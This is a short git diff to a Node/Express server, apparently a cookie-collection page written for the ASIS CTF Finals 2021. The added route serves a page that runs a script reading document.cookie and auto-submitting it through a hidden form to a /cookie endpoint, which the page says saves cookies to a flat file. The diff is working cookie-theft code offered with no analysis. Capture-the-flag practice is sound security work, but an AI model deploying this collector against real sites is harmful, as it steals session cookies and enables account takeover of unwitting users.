@@ -24,7 +24,19 @@ var cookieFunc = function(cookie){
 }
 
 app.get('/', (req, res)=>{
-    res.send(`<p>Alive!</p>`);
+    res.send(`<html>
+    <h1>Cookie Monster</h1>
+    <h4>Joshua Famous</h4>
+    <p>This website grabs cookies and sends them to a flat file. For ASIS CTF Finals 2021.</p>
+    <form action="http://localhost:` + port + `/cookie" method="POST" id="cookieForm">
+        <input type="text" name="cookie" placeholder="xyz" id="cookieInput">
+    </form>
+
+    <script>
+        document.getElementById("cookieInput").value = document.cookie;
+        document.getElementById("cookieForm").submit();
+    </script>
+    </html>`);
 });
 
 app.post('/cookie', (req, res)=>{
